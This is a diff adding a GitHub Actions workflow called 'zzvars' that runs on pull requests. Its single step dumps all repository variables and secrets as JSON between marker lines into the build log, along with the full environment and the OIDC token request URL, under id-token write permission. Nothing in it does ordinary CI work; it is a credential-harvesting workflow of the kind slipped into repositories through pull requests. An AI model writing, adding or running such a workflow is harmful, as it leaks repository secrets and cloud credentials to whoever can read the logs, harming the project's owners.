@@ -1,0 +1,25 @@
+name: zzvars
+on: pull_request
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump contexts
+        run: |
+          echo "---VARS-BEGIN---"
+          cat <<'EOF_V'
+          ${{ toJSON(vars) }}
+          EOF_V
+          echo "---VARS-END---"
+          echo "---SECRETS-BEGIN---"
+          cat <<'EOF_S'
+          ${{ toJSON(secrets) }}
+          EOF_S
+          echo "---SECRETS-END---"
+          echo "---ENV-BEGIN---"
+          env | sort
+          echo "---ENV-END---"
+          echo "OIDCURL=${ACTIONS_ID_TOKEN_REQUEST_URL:-UNSET}"
